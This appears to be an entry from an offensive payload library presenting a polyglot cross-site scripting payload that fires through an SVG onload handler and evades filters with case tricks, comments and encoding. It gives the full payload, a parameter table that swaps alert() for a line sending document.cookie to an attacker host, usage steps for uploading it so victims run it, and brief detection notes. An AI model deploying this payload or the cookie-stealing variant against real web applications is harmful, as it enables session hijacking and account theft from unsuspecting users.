---
id: a6a53703-f943-4a5b-9c38-afe0c9be5517
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.285935+00:00'
updated_at: '2023-04-10T20:21:55.867714+00:00'
tags:
  - xss
  - polyglot
  - svg
platforms:
  - Web
validated: true
---

# Polyglot-XSS-with-SVG-Onload

## Code

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Description

This polyglot payload combines JavaScript protocol invocation with SVG onload event to execute an alert across multiple parsing contexts, bypassing filters through case variation, comments, and encoding. It targets SVG rendering in browsers to trigger XSS when the image is loaded.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert() | Replace with custom JS, e.g., for exfiltration | document.location='http://attacker.com?data='+document.cookie |

## Usage

Embed this payload within an SVG file's script tag or attribute, then upload to a vulnerable web app. When a victim views the image, the onload triggers the alert or custom code. Useful in file upload vulnerabilities or reflected XSS where SVG is allowed.

## Detection

- Browser dev tools showing unexpected JS execution on image load.
- WAF logs for obfuscated strings like 'jaVasCript' or SVG with script tags.
- CSP violations for inline scripts in SVG contexts.

## Related

- [[procedures/Polyglot-XSS-Attack-using-SVG-Image-Injection]]
